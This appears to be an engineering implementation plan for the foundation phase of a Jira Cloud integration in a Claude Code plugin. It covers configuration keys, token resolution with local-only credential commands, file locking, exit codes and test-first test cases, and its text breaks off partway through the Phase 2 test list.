---
date: "2026-04-29T23:00:00+01:00"
last_revised: "2026-05-01T00:00:00+01:00"
type: plan
skill: create-plan
ticket: ""
status: complete
revision: 2
---

# Jira Integration Phase 1 — Foundation Implementation Plan

## Overview

Establish the foundation for a new `skills/integrations/jira/` category by
adding the configuration schema, authentication resolution, signed HTTP
request helper, JQL safe-quoting builder, the bidirectional Markdown ↔
Atlassian Document Format (ADF) converter pair, the custom-field discovery
helper, and the `init-jira` skill that ties them together. No user-visible
read or write skills (search, show, create, update, transition, comment,
attach) are delivered in this phase — those are Phases 2–4 of the
research. The deliverable is a foundation a user can `/init-jira` against
a real Jira Cloud tenant to verify their credentials and persist the
team-shared field/project catalogue under `meta/integrations/jira/`.

The work proceeds under strict TDD: every helper script ships with a
test script that covers the contract before the helper is implemented.
The single SKILL.md authored in this phase (`init-jira`) is created via
the `skill-creator:skill-creator` skill rather than written by hand. ADRs
are out of scope: the load-bearing decisions (transport, skill location,
auth model, state location, default-project-key reuse, output convention,
Markdown subset) are captured in
`meta/research/codebase/2026-04-29-jira-cloud-integration-skills.md` and inlined
below where the phase consumes them. ADR-0017 (configuration extension
points) frames the new `jira.*` config section. The longer-term
`meta/integrations/` → `.accelerator/state/integrations/` reorg captured
in `meta/notes/2026-04-29-accelerator-config-state-reorg.md` is also out
of scope here; this plan commits the v1 location and accepts the future
migration cost.

**Convention notes (apply throughout this plan):**

- The integration's persisted-state location is shown as
  `meta/integrations/jira/` for readability, but every helper, test
  fixture path, and SKILL preprocessor consults
  `paths.integrations` via the `jira_state_dir` function in
  `jira-common.sh`. `meta/integrations/jira/` is the default — a
  user who sets `paths.integrations: .accelerator/state/integrations`
  in `accelerator.md` relocates the cache without editing any
  helper. This is the single point of change for the deferred
  reorg captured in
  `meta/notes/2026-04-29-accelerator-config-state-reorg.md`.
- The auth helper splits into a sourceable library `jira-auth.sh`
  (no shebang dispatch, no `set -euo pipefail`) and a thin CLI
  wrapper `jira-auth-cli.sh`. Direct shell invocations
  throughout this plan refer to `jira-auth-cli.sh`; `source` references
  refer to `jira-auth.sh`. The `jira-jql` helper splits the same
  way (`jira-jql.sh` lib + `jira-jql-cli.sh` wrapper).

## Current State Analysis

### Existing extension points

The Accelerator plugin currently registers nine skill categories in
`.claude-plugin/plugin.json:10-20`. Each entry is a category-level
directory whose immediate subdirectories are individual skills (e.g.
`./skills/work/` registers `create-work-item/`, `list-work-items/`, etc.).
Adding a new `./skills/integrations/jira/` entry follows the same shape.

The userspace config reader (`scripts/config-read-value.sh:6-129`) is
content-agnostic — it accepts any two-level YAML key and is already
exercised by `work.id_pattern` and `work.default_project_code`
(`scripts/test-config.sh:312-361`). New `jira.*` keys need no reader
changes; only documentation in `skills/config/configure/SKILL.md` and
test cases in `scripts/test-config.sh`.

The work-item ID pattern feature shipped in 2026-04-28 introduced
`work.default_project_code` (`scripts/config-read-value.sh` consumed at
`skills/work/scripts/work-item-resolve-id.sh:45`). This research
**reuses that key as the default Jira project key** — no
`jira.default_project_key` is introduced.

### Bash style and test framework

Helper scripts follow the conventions established by
`skills/work/scripts/work-item-common.sh`:

- Sourceable libraries omit `set -euo pipefail` (callers inherit; library
  semantics use return codes).
- CLI wrappers (`work-item-pattern.sh`, `work-item-resolve-id.sh`) start
  with `#!/usr/bin/env bash` then `set -euo pipefail`, compute
  `SCRIPT_DIR` via `BASH_SOURCE`, source the library, and dispatch on
  args.
- Public functions use a namespace prefix (`wip_*`); internal helpers
  use `_wip_*`. We will use `jira_*` / `_jira_*`.
- Errors emitted on stderr with stable `E_*` prefixes; success on stdout;
  predicates use exit code only.
- Repo root located via `find_repo_root` from
  `scripts/vcs-common.sh` with a `$PWD` fallback
  (`work-item-resolve-id.sh:18-22,36`).

Tests are standalone bash scripts that source
`scripts/test-helpers.sh` for the assertion library
(`assert_eq`, `assert_exit_code`, `assert_file_executable`,
`assert_stderr_empty`, `test_summary`). Test scripts often define their
own `assert_contains`, `assert_matches_regex`,
`assert_file_content_eq`, and a `setup_repo()` helper that creates a
`mktemp` dir with a `.git` marker (matching `find_repo_root`'s
contract). Fixtures use inline heredocs and golden-file pairs under
`test-fixtures/`. Test wiring lives in `tasks/test.py`; the runner is
`mise run test`.

`scripts/test-format.sh` enforces only the "work item" hyphenation
guard (forbidding `work item-x` and `work items/`); no line-length,
trailing-whitespace, or markdown-lint enforcement. New Jira files are
unaffected by this lint as long as they avoid the forbidden tokens.

`.shellcheckrc` and `.markdownlint.json` exist at repo root but do not
fail the build; they apply via editor integration rather than CI.

### SKILL.md authoring

Skill prose lives in `<category>/<skill-name>/SKILL.md` with YAML
frontmatter (`name`, `description`, optional `argument-hint`,
`disable-model-invocation`, `allowed-tools`). Bang-prefix preprocessor
lines (`!\`${CLAUDE_PLUGIN_ROOT}/scripts/config-read-context.sh\``)
inject context at load time. The closing
`config-read-skill-instructions.sh <skill-name>` line is conventional.
The `skill-creator:skill-creator` skill is the recommended authoring
path and will be used for `init-jira/SKILL.md` in this phase.

### Key Discoveries

- `scripts/config-read-value.sh` is content-agnostic — `jira.*` keys
  need no plumbing. New cases in `scripts/test-config.sh:312-361`-style
  exercise the reader.
- `.claude-plugin/plugin.json:10-20` skills array is category-level.
  Add `./skills/integrations/jira/` and any leaf SKILL.md is
  auto-discovered.
- `tasks/test.py:7-52` is the integration test wiring. New test scripts
  need a `context.run("...")` line.
- `skills/work/scripts/work-item-common.sh:1-25` is the canonical
  sourceable-library template (header, namespace, no `set`).
- `scripts/test-helpers.sh:1-83` exposes the assertion library;
  per-test-script `assert_contains` / `setup_repo` are the established
  extensions.
- `meta/integrations/` does not yet exist anywhere in the repo — the
  Phase 1 `.gitkeep` is its first occurrence.
- The configure SKILL.md `work` section at
  `skills/config/configure/SKILL.md:424-518` is the format model for
  the new `jira` section (table, YAML example, recognised-keys note).
- The configure SKILL.md "Parser Constraints" section
  (`skills/config/configure/SKILL.md:619-626`) documents the 2-level
  nesting limit and YAML-comment unsupported-ness — `jira.*` falls
  within these limits.

## Desired End State

After Phase 1 lands:

1. `bash scripts/config-read-value.sh jira.site '<default>'` reads the
   configured Cloud subdomain, defaulting to the supplied default when
   unset; same for `jira.email`, `jira.token`, `jira.token_cmd`.
2. `bash skills/integrations/jira/scripts/jira-auth-cli.sh` exits 0
   when credentials are resolvable through the chain
   (env > `_TOKEN_CMD` > `accelerator.local.md` > shared
   `jira.token`; `jira.token_cmd` from `accelerator.md` is ignored
   with a warning) and prints `site=` `email=` `token=` lines on
   stdout — the token is never logged to stderr or under `--debug`,
   and never appears in `ps`/`/proc/<pid>/cmdline` output during any
   subprocess.
3. `bash skills/integrations/jira/scripts/jira-request.sh GET /rest/api/3/myself`
   exits 0 with the JSON body on stdout when authentication succeeds
   against a live (or mock) tenant; exits with the documented per-status
   exit codes (11 for 401, 12 for 403, 13 for 404, 19 for 429, 20 for
   5xx) and surfaces the response body on stderr otherwise.
4. `bash skills/integrations/jira/scripts/jira-jql-cli.sh compose --project ENG --status 'In Progress' --status '~Done'`
   prints a safely-quoted JQL string `project = 'ENG' AND status IN ('In Progress') AND status NOT IN ('Done')`.
5. `bash skills/integrations/jira/scripts/jira-md-to-adf.sh < input.md > out.adf.json`
   compiles supported Markdown into valid ADF v1; the inverse
   `jira-adf-to-md.sh < input.adf.json > out.md` round-trips it back to
   Markdown that re-compiles to the same ADF on the supported subset.
6. `bash skills/integrations/jira/scripts/jira-fields.sh refresh`
   refreshes `meta/integrations/jira/fields.json` from
   `GET /rest/api/3/field`; `jira-fields.sh resolve story-points`
   prints `customfield_10016` (or the instance-specific ID) from the
   cache.
7. `/init-jira` walks the user through site/email/token verification,
   discovers projects and fields against the live tenant, and persists
   `meta/integrations/jira/{site,fields,projects}.json`. Idempotent on
   re-run.
8. `mise run test` passes; `bash skills/integrations/jira/scripts/test-jira-scripts.sh`
   passes in isolation.

### Verification

- `bash scripts/config-read-value.sh jira.site ''` returns the configured
  site or empty.
- `bash skills/integrations/jira/scripts/jira-auth-cli.sh` resolves
  credentials in the documented order; the token (asserted via
  sentinel value) does not appear in any output stream, base64/URL
  encoding, temp file, or `ps`/`/proc/<pid>/cmdline` entry other than
  the stdout `token=` line that the caller reads into a variable.
- `bash skills/integrations/jira/scripts/jira-request.sh GET /rest/api/3/myself`
  returns a 200 JSON body or exits with a status-mapped exit code and
  body on stderr.
- `bash skills/integrations/jira/scripts/jira-md-to-adf.sh < tests/fixtures/round-trip-001.md | jq .`
  produces valid ADF; `jira-adf-to-md.sh` reverses it to text matching
  the input on the supported subset.
- `/init-jira` against a real tenant prints a confirmation line and
  populates `meta/integrations/jira/`.

## What We're NOT Doing

Out of scope for Phase 1:

- The seven user-visible Jira skills (`search-jira-issues`,
  `show-jira-issue`, `create-jira-issue`, `update-jira-issue`,
  `transition-jira-issue`, `comment-jira-issue`,
  `attach-jira-issue`). Phases 2–4 in the research.
- The `sync-work-items` skill that bridges `skills/work/` and Jira.
- Jira Server / Data Center support; only Cloud.
- Scoped API tokens (require `cloudId` lookup and a different base URL);
  only classic API tokens via HTTP Basic.
- OAuth 3LO, Forge, Connect.
- Issue links, bulk operations, deletion.
- `meta/integrations/` → `.accelerator/state/integrations/` reorg
  captured in `meta/notes/2026-04-29-accelerator-config-state-reorg.md`.
- ADF features outside the supported subset (tables, panels, expand,
  blockquote, mediaSingle, mediaGroup, status, date, mention, emoji,
  inlineCard, rule, strike, underline, sub/sup, text colour, nested
  lists). These round-trip as `[unsupported ADF node: <type>]` placeholders
  on read; rejected with a clear error on write.
- `--plain`/`--csv` output formats. Helpers emit raw API JSON; skills
  format from JSON.
- A generalised `http-request.sh` helper. Wait for the second concrete
  integration (Linear, Trello) before lifting `jira-request.sh`.
- A migration to mass-rename `meta/integrations/jira/` to a future
  location.

## Implementation Approach

Seven milestones, each TDD: tests committed before / alongside the
helper they cover. Each milestone leaves the tree green (`mise run test`
passes). The order surfaces value early — the skeleton lands first so
imports and registration are stable; pure-bash helpers (common, auth,
JQL) come next; the ADF round-trip pair is the largest single piece;
the network-touching `jira-request.sh` follows once a mock server
fixture is in place; `jira-fields.sh` exercises the request helper end
to end; and `init-jira` ties everything together via the
`skill-creator:skill-creator` skill.

```
M1: skeleton, config docs, plugin registration, test wiring
       │
       ▼
M2: jira-common.sh + jira-auth.sh                ◄─ pure bash, no network
       │
       ▼
M3: jira-jql.sh                                  ◄─ pure bash, no network
       │
       ▼
M4: jira-adf-to-md.sh, jira-md-to-adf.sh         ◄─ pure jq + awk, no network
       │
       ▼
M5: jira-request.sh                              ◄─ Python mock (test-infra only)
       │
       ▼
M6: jira-fields.sh                               ◄─ uses request + mock
       │
       ▼
M7: init-jira/SKILL.md (via skill-creator)       ◄─ end-to-end manual verify
```

### Exit-code manifest

A single `skills/integrations/jira/scripts/EXIT_CODES.md` file
documents the full exit-code namespace for the integration. Each
helper's header comment links to it rather than duplicating the
mapping. The numeric ranges follow a per-helper grouping (avoiding
both the "HTTP-status mirror" and "abstract" encoding mix that the
review flagged):

- 0 — success.
- 1–9 — generic argument/usage errors (reserved; helpers exit 2 on
  argv parse failures, matching `set -e` defaults).
- 11–22 — `jira-request.sh` (network/HTTP layer; codes match the
  list in Phase 5 §3).
- 24–29 — `jira-auth.sh` / `jira-auth-cli.sh`. `24=E_NO_TOKEN`,
  `25=E_TOKEN_CMD_FAILED`, `26=E_TOKEN_CMD_FROM_SHARED_CONFIG`,
  `27=E_AUTH_NO_SITE`, `28=E_AUTH_NO_EMAIL`,
  `29=E_LOCAL_PERMS_INSECURE`. (The previously name-only auth
  errors are pinned to numbers so callers can branch on `$?`.)
- 30–33 — `jira-jql.sh` (composition errors).
- 40–42 — ADF helpers (compile/render errors).
- 50–53 — `jira-fields.sh` (cache errors and lock contention).
- 60–69 — `init-jira` orchestration (`jira-init-flow.sh` —
  `60=E_INIT_NEEDS_CONFIG`, `61=E_INIT_VERIFY_FAILED`, etc.).

The rationale comment in `EXIT_CODES.md` notes that the gaps inside
the request range (15–18 are validation/test-override codes added
in revision) are intentional and reserved, so the mapping does not
have to renumber when new conditions emerge. The previously-reserved
slot 23 is now claimed by `E_TEST_HOOK_REJECTED` (test-seam name
or mode gate failed for `JIRA_RETRY_SLEEP_FN` /
`JIRA_ADF_LOCALID_SEED`); future `E_REQ_TIMEOUT` if needed will
expand the range upward (24+) — the request range becomes 11–23 in
practice, with the auth range starting at 24 unchanged.

`EXIT_CODES.md` also documents the **test-seam policy** (the
project-wide convention that the plan's revisions establish):

- Production-code test seams (e.g. `ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST`,
  `JIRA_RETRY_SLEEP_FN`, `JIRA_ADF_LOCALID_SEED`) are honoured
  **only when `ACCELERATOR_TEST_MODE=1` is also set**.
- A failed gate produces `E_TEST_OVERRIDE_REJECTED` (18) for the
  URL override or `E_TEST_HOOK_REJECTED` (a new code in the
  request helper's range) for the function/seed hooks; in either
  case the helper continues with production behaviour.
- Every test-seam env var is listed in `EXIT_CODES.md` alongside
  its gating semantics so future contributors have one place to
  find the convention.

Cross-cutting principles for every milestone:

- **TDD**: write the test script first; assert the contract; run it (red);
  implement the helper; run again (green); commit.
- **Namespacing**: all shell functions in helpers use `jira_*` /
  `_jira_*`. CLI wrapper exit codes documented in a header comment.
- **No live API calls in CI**: `jira-request.sh` and `jira-fields.sh`
  tests use the local Python mock server fixture (M5). Python is a
  pinned dev dependency (`mise.toml`) — the mock server is test
  infrastructure only; all runtime helpers are pure bash/curl/jq/awk.
- **Token redaction**: `jira-auth.sh` and `jira-request.sh` must never
  print the token to stderr or under `--debug`. Tests verify this.
- **Atomic writes**: helpers that persist to `meta/integrations/jira/`
  use `scripts/atomic-common.sh:atomic_write` so partial writes cannot
  leave the cache corrupt.
- **Multi-file refresh locking**: any helper that writes more than
  one file under `<paths.integrations>/jira/` (currently
  `init-jira` and `jira-fields.sh refresh` when called from
  `init-jira`) acquires an exclusive lock on
  `<paths.integrations>/jira/.lock` for the duration of the
  refresh. Single-file writes (`jira-fields.sh refresh` standalone)
  take the lock too, so a user running `jira-fields.sh refresh`
  while `init-jira` is mid-flight serialises cleanly. The lock
  directory is gitignored.

  **Implementation: `mkdir`-based atomic locking on every
  platform** (no `flock` dependency). `flock(1)` is Linux-specific
  (util-linux) and absent from macOS — the user's primary dev
  platform. `flock(2)` exists in libc on macOS but invoking it
  from bash requires the linux `flock(1)` wrapper. Maintaining two
  divergent code paths (and testing both) is more cost than benefit
  given that `mkdir <dir>` is atomic on every POSIX filesystem and
  has uniform argv shape across platforms.

  `jira_with_lock <fn>` semantics:
  1. Compute `lockdir = <paths.integrations>/jira/.lock`.
  2. Loop with 100 ms `sleep`, up to 60 s wall total:
     - `mkdir "$lockdir" 2>/dev/null` — succeeds atomically if no
       holder exists.
     - On success, write **two** files to record the holder
       (atomically, via `printf > tmp && mv tmp final`):
       `holder.pid` containing `$$`, and `holder.start` containing
       the process start-time read via the portable helper
       `_jira_proc_starttime $$` (which reads `/proc/$$/stat`
       field 22 on Linux, `ps -o lstart= -p $$` on macOS/BSD, or
       falls back to `date +%s` if neither is available — the
       fallback degrades to PID-only recovery on that platform).
       Also write `holder.cmd` containing the invoking script
       basename (`$(basename "$0")`) for diagnostic messages.
       Then run `<fn>`, remove `$lockdir` on exit (via
       `trap … EXIT` so kills are handled — but acknowledged not
       to fire on SIGKILL; stale recovery handles that case).
     - On `mkdir` failure, read `$lockdir/holder.pid` and
       `$lockdir/holder.start`. The holder is considered alive
       only if **both** of:
         (a) `kill -0 $holder_pid` succeeds, AND
         (b) `_jira_proc_starttime $holder_pid` equals the value
             stored in `holder.start`.
       If the start-time check disagrees, the PID has been
       recycled to an unrelated process; the lock is stale.
       If the holder is stale, atomically reclaim by renaming
       the lockdir aside (`mv "$lockdir" "$lockdir.stale.$$"`
       then `rm -rf "$lockdir.stale.$$"`); the `mv` is the
       linearisation point — a concurrent acquirer's `mkdir`
       either sees the dir or doesn't, never the contents.
       After reclaim, retry the `mkdir`. If `holder.start` is
       missing or unparseable (older lock from a SIGKILLed
       holder, or the start-time helper fell back to `date +%s`
       on a platform without `/proc` or `ps -o lstart`), use the
       holder.pid mtime: if the lock dir is older than 60 s
       AND `kill -0` succeeds (PID-reuse fallback), treat as
       stale.
       If the holder is alive, sleep 100 ms and continue.
  3. On 60 s timeout exit `E_REFRESH_LOCKED` (53) with an error
     naming both the holder PID and the invoking script
     (e.g. `E_REFRESH_LOCKED: lock held by jira-init-flow.sh
     (pid 12345) for >60s`).

  Stale-lock recovery (the `kill -0` + start-time check) is
  required because `mkdir`-based locks do not auto-release on
  process death the way `flock(2)` does. The PID + start-time
  pair defends against PID-reuse where `kill -0` would otherwise
  succeed against a recycled but unrelated process. The
  `mv`-then-`rm` reclaim sequence atomically transfers control
  of the lockdir name, closing the TOCTOU window between
  detection and break. Tests cover: two backgrounded writers
  serialise cleanly (Phase 6 case 13); a dead-holder lock
  recovers automatically (new Phase 2 case); a SIGKILLed
  holder's lock recovers within bounded retries (new Phase 2
  case); a recycled-PID scenario does not produce false-alive
  (new Phase 2 case using a deliberately-stamped wrong
  start-time).

  **Documented portability limitations**:
  - `kill -0` may produce false negatives in PID-namespaced
    containers (Alpine, gVisor, sandboxes where the holder runs
    in a different PID namespace). On those environments the
    lock degrades to "best-effort serialisation" rather than
    strict mutual exclusion. Documented in the helper header.
  - `mkdir` atomicity is not guaranteed on NFS/SMB-mounted state
    directories. Users who relocate `paths.integrations` onto a
    network mount lose the serialisation guarantee; the helper
    detects this via `_jira_fstype <path>` — a pure bash/awk
    function that resolves the filesystem type without Python.
    On Linux it reads `/proc/mounts` with awk to find the longest
    matching mount point; on macOS it parses `mount` output with
    awk. The detected type is matched against a known list
    (`nfs`, `nfs4`, `smb`, `cifs`, `smbfs`, `fuse.sshfs`).
    `stat -f -c %T` (GNU-only) and `df -T` (GNU-only) are
    deliberately avoided because they fail on macOS, the user's
    primary dev platform. On detection, the helper emits a
    one-time warning at lock acquisition:
    `Warning: jira_state_dir on non-local filesystem; lock
    serialisation is best-effort`. If the detection itself fails
    (mountpoint inaccessible), no warning is emitted and the lock
    proceeds — best-effort detection, not a safety gate.
- **Byte-idempotency in committed caches**: persisted JSON files
  under `meta/integrations/jira/` (committed to VCS) must be byte-
  identical after a no-op refresh. Mutable metadata
  (`lastUpdated`, last verification time) lives in sibling
  `.refresh-meta.json` files that are gitignored.
- **Idempotency**: every helper that mutates state is idempotent on
  re-run.

## Phase 1: Skeleton, config docs, plugin registration, test wiring

### Overview

Land the directory structure, register the new skill category, document
the `jira.*` config section, add `jira.*` test cases to
`scripts/test-config.sh`, and wire the (initially empty) umbrella test
script into `tasks/test.py`. No helpers exist yet — this phase is purely
the scaffolding under which subsequent milestones compile.

### Changes Required

#### 1. Directory skeleton

Create the new tree:

```
skills/integrations/jira/
  scripts/
    test-fixtures/                  # inert data files only (golden, samples, scenario JSON)
      adf-samples/
      api-responses/                # captured real Jira responses (Phase 5/E4)
    test-helpers/                   # test infrastructure (executable Python, etc.)
    test-jira-scripts.sh            # umbrella runner; calls per-helper test scripts
<paths.integrations>/jira/          # default: meta/integrations/jira/
  .gitkeep
.gitignore                          # add: <paths.integrations>/jira/.lock,
                                    #      <paths.integrations>/jira/.refresh-meta.json
```

`skills/integrations/jira/scripts/test-jira-scripts.sh` is initially a
stub: it sources `scripts/test-helpers.sh`, calls `test_summary`, exits
0. Subsequent milestones add `bash "$SCRIPT_DIR/test-jira-<name>.sh" || EXIT_CODE=1`
lines to it.

`meta/integrations/jira/.gitkeep` is an empty file ensuring the
directory is committed.

#### 2. Plugin registration

**File**: `.claude-plugin/plugin.json`
**Changes**: add the new category to the `skills` array. The array
is **workflow-ordered**, not alphabetical — its current sequence
(`vcs, github, planning, research, decisions, work, review/lenses,
review/output-formats, config`) groups categories by lifecycle
(version control → external trackers → planning → execution →
review → meta). `./skills/integrations/jira/` is grouped with
`github` (the only other external-tracker integration) and
inserted immediately after it. Future integrations (Linear,
Trello) land in the same group.

`plugin.json` is strict JSON and does not support comments, so the
ordering rule cannot be documented inline. Document it instead as
a new "Skill registration order" subsection in
`skills/config/configure/SKILL.md` (alongside the `paths` table
extension added in Phase 1 §3a) so contributors editing `plugin.json`
have a discoverable single source of truth. The configure SKILL is
already the project's authority on plugin-level configuration; this
sits naturally beside it.

```json
{
  "skills": [
    "./skills/vcs/",
    "./skills/github/",
    "./skills/integrations/jira/",
    "./skills/planning/",
    "./skills/research/",
    "./skills/decisions/",
    "./skills/work/",
    "./skills/review/lenses/",
    "./skills/review/output-formats/",
    "./skills/config/"
  ]
}
```

#### 3a. Add `paths.integrations` to the configure schema

**File**: `skills/config/configure/SKILL.md`
**Changes**: extend the `paths` table (currently lists twelve
`meta/` subdirs at lines 386–399) with one new row:

| `integrations` | `meta/integrations` | Per-integration cached state (Jira fields/projects, future Linear/Trello caches) |

Every `meta/` subdir is a configurable, named output category in
this project; introducing `meta/integrations/` without a `paths`
entry would be a precedent break. The `jira_state_dir` function in
`jira-common.sh` reads `paths.integrations` via
`bash scripts/config-read-path.sh integrations meta/integrations`
(matching the pattern used by `work-item-resolve-id.sh:38` for
`paths.work`). All Jira helpers — and any future integration —
route through `jira_state_dir` rather than embedding the literal
path.

The deferred `meta/integrations/` → `.accelerator/state/integrations/`
reorg captured in
`meta/notes/2026-04-29-accelerator-config-state-reorg.md` becomes a
single-point-of-change configuration update once `paths.integrations`
is in place. **No SKILL.md prose, success criterion, helper, or
manual-verification step in this plan should reference the literal
path `meta/integrations/jira/`** — every reference goes through
`jira_state_dir` (or `paths.integrations/jira/` in user-facing prose
where the path needs to be displayed).

#### 3b. Configure SKILL.md `jira` section

**File**: `skills/config/configure/SKILL.md`
**Changes**: insert a new `### jira` section between the `work` block
(ends line 518) and the `templates` block (begins line 520). Mirror the
`work` section's shape: paragraph, table of recognised keys, YAML
example, recognised-keys note.

```markdown
### jira

Configure access to a Jira Cloud tenant. Two keys belong in
team-shared `accelerator.md`:

| Key      | Default | Description                                |
|----------|---------|--------------------------------------------|
| `site`   | (empty) | Cloud subdomain (e.g. `atomic-innovation`) |
| `email`  | (empty) | Atlassian account email                    |

Example shared configuration in `accelerator.md`:

\```yaml
---
jira:
  site: atomic-innovation
  email: toby@go-atomic.io
---
\```

#### Local-only credentials (do not commit)

Two additional keys exist for credential storage. **Both must live
exclusively in `accelerator.local.md`**, which is gitignored:

| Key         | Default | Description                                 |
|-------------|---------|---------------------------------------------|
| `token`     | (empty) | Plaintext API token (discouraged — prefer `token_cmd`) |
| `token_cmd` | (empty) | Shell command whose stdout is the token    |

`token_cmd` from the team-shared `accelerator.md` is **never**
honoured: a committed `token_cmd` is a supply-chain
command-injection sink (a single PR could land arbitrary shell that
runs on every contributor's machine). When detected, the resolver
emits `E_TOKEN_CMD_FROM_SHARED_CONFIG: jira.token_cmd in
accelerator.md ignored — move to accelerator.local.md` to stderr.

`token` plaintext is supported but discouraged — prefer `token_cmd`
with a password manager. The resolver checks `accelerator.local.md`
permissions and warns if looser than `0600`.

Example `accelerator.local.md` (preferred form, using a password
manager):

\```yaml
---
jira:
  token_cmd: "op read op://Work/Atlassian/credential"
---
\```

Authentication resolves through this chain (first non-empty wins):

1. `ACCELERATOR_JIRA_TOKEN` env var.
2. `ACCELERATOR_JIRA_TOKEN_CMD` env var (run via `bash -c`, stdout
   trimmed).
3. `accelerator.local.md` `jira.token`.
4. `accelerator.local.md` `jira.token_cmd`.
5. `accelerator.md` `jira.token` *(only when
   `accelerator.local.md` does not exist; emits a runtime warning)*.

`jira.token_cmd` is **never** consumed from the team-shared
`accelerator.md` file. Only the four sources above (env vars and
`accelerator.local.md`) are honoured. A `jira.token_cmd` value found
in `accelerator.md` is ignored; a runtime warning prints
`E_TOKEN_CMD_FROM_SHARED_CONFIG: jira.token_cmd in accelerator.md
ignored — move to accelerator.local.md` to stderr. Rationale: a
committed `token_cmd` is a supply-chain command-injection sink — a
single PR could land `jira.token_cmd: "<arbitrary shell>"` and that
command would execute on every contributor's machine the next time
any Jira helper or `/init-jira` ran. Restricting the executable
indirection to local-only files keeps the blast radius bounded to
the user's own machine.

`token_cmd` is the supported integration point for password managers
and keychains: 1Password CLI (`op read ...`), `pass`, macOS Keychain
(`security find-generic-password ...`), Freedesktop Secret Service
(`secret-tool ...`), and AWS Secrets Manager all work without
plugin-side knowledge.

The default Jira project key is **`work.default_project_code`** — the
same key used by the work-item ID pattern. No separate
`jira.default_project_key` exists.

#### Recognised keys

Only `jira.site`, `jira.email`, `jira.token`, and `jira.token_cmd` are
recognised. Other `jira.*` keys are not consumed by any plugin script.
```

#### 4. test-config.sh `jira.*` cases

**File**: `scripts/test-config.sh`
**Changes**: add a new test block adjacent to the existing `work.*`
block (line 312). Replicate its four-case structure: reads from team,
defaults, local override wins, single-key isolation.

```bash
echo "Test: jira.* keys read from team config"
REPO=$(setup_repo)
mkdir -p "$REPO/.claude"
cat > "$REPO/.claude/accelerator.md" << 'FIXTURE'
---
jira:
  site: atomic-innovation
  email: toby@go-atomic.io
  token_cmd: "op read op://Work/Atlassian/credential"
---
FIXTURE
OUTPUT=$(cd "$REPO" && bash "$READ_VALUE" "jira.site" "")
assert_eq "reads jira.site" "atomic-innovation" "$OUTPUT"
OUTPUT=$(cd "$REPO" && bash "$READ_VALUE" "jira.email" "")
assert_eq "reads jira.email" "toby@go-atomic.io" "$OUTPUT"
OUTPUT=$(cd "$REPO" && bash "$READ_VALUE" "jira.token_cmd" "")
assert_eq "reads jira.token_cmd" "op read op://Work/Atlassian/credential" "$OUTPUT"

echo "Test: jira.* defaults when unset"
REPO=$(setup_repo)
mkdir -p "$REPO/.claude"
cat > "$REPO/.claude/accelerator.md" << 'FIXTURE'
---
agents:
  reviewer: senior-dev
---
FIXTURE
OUTPUT=$(cd "$REPO" && bash "$READ_VALUE" "jira.site" "")
assert_eq "empty default for jira.site" "" "$OUTPUT"

echo "Test: jira.token local override wins"
REPO=$(setup_repo)
mkdir -p "$REPO/.claude"
cat > "$REPO/.claude/accelerator.md" << 'FIXTURE'
---
jira:
  site: atomic-innovation
  email: toby@go-atomic.io
---
FIXTURE
cat > "$REPO/.claude/accelerator.local.md" << 'FIXTURE'
---
jira:
  token: "secret-local-token"
---
FIXTURE
OUTPUT=$(cd "$REPO" && bash "$READ_VALUE" "jira.token" "")
assert_eq "local jira.token wins" "secret-local-token" "$OUTPUT"
OUTPUT=$(cd "$REPO" && bash "$READ_VALUE" "jira.site" "")
assert_eq "team jira.site preserved" "atomic-innovation" "$OUTPUT"
```

#### 5. tasks/test.py wiring

**File**: `tasks/test.py`
**Changes**: insert a `context.run("skills/integrations/jira/scripts/test-jira-scripts.sh")`
block after the work-item pattern tests, mirroring the print/blank-line
style of the surrounding entries.

```python
print("Running jira integration script tests...")
context.run("skills/integrations/jira/scripts/test-jira-scripts.sh")
print("\n")
```

### Success Criteria

#### Automated Verification

- [x] `mise run test` passes (the new umbrella stub is wired and runs
  cleanly).
- [x] `bash scripts/test-config.sh` passes with the new `jira.*` cases.
- [x] `bash skills/integrations/jira/scripts/test-jira-scripts.sh`
  passes (stub returns 0 with no failed assertions).
- [x] `bash scripts/config-read-value.sh jira.site '<default>'` returns
  the default literally when no config is set.
- [x] `jq -e '.skills | index("./skills/integrations/jira/")' .claude-plugin/plugin.json`
  returns a non-null index.
- [x] `bash scripts/test-format.sh` passes (no `work item-` violations
  in new files).

#### Manual Verification

- [ ] Open `/configure help` in Claude Code and confirm the new `### jira`
  section appears between `### work` and `### templates`.
- [ ] Confirm `meta/integrations/jira/.gitkeep` is committed (no
  contents).
- [ ] Confirm the directory tree exists:
  `tree skills/integrations/jira/scripts test-fixtures meta/integrations/jira`.

---

## Phase 2: jira-common.sh and jira-auth.sh

### Overview

Land the foundational sourceable helpers under
`skills/integrations/jira/scripts/`. `jira-common.sh` provides path and
JSON utility functions; `jira-auth.sh` resolves credentials through the
documented six-step chain with no token leakage. Both ship with full
test coverage before implementation begins.

### Changes Required

#### 1. test-jira-common.sh (TDD: write first)

**File**: `skills/integrations/jira/scripts/test-jira-common.sh`
**Changes**: new test script. Sources `scripts/test-helpers.sh` and
defines local `assert_contains`, `assert_file_exists` matching the
project conventions. Asserts:

- `jira_repo_root` returns the `.git`-marked test repo root.
- `jira_state_dir` returns `<repo_root>/meta/integrations/jira` and
  creates the directory if missing.
- `jira_die "msg"` exits non-zero with `msg` on stderr.
- `jira_warn "msg"` writes `Warning: msg` to stderr and continues.
- `jira_jq_field <json> <path>` extracts a value via `jq -r`; returns
  empty for missing paths.
- `jira_atomic_write_json <path>` consumes stdin, validates it parses
  via `jq empty`, and writes via `atomic_write` from
  `scripts/atomic-common.sh`.
- Invalid JSON on stdin to `jira_atomic_write_json` exits non-zero with
  `E_BAD_JSON` on stderr and leaves the target file unchanged.
- **Concurrent writers**: two background `jira_atomic_write_json`
  invocations targeting the same path complete without
  interleaving. The final file's content equals exactly one of the
  two inputs (atomicity); the other input is wholly absent.
- **Mid-write interruption**: a writer that is killed (`kill -9`)
  between `>` and `mv` leaves no `.tmp` file behind in the target
  directory and the original file (if any) is intact and parses as
  JSON.
- **Cross-device target**: when the target path is on a different
  filesystem than `mktemp`'s default (simulated via `TMPDIR=/tmp`
  with a target on a tmpfs mount, or vice versa), the write still
  succeeds — `atomic_write` falls back to `cp + sync + rename`
  rather than failing with EXDEV.
- **Symlink target**: when the target file is a symlink to another
  file, the write replaces the symlink target's contents (or the
  symlink itself, depending on `atomic_write`'s contract — assert
  whichever the helper documents and verify it does not silently
  follow the symlink in a way that lets a malicious symlink
  redirect writes).
- **Unwritable directory**: when the parent directory is read-only,
  the write exits non-zero with a clear error and does not partial-
  write or leave a `.tmp` file.
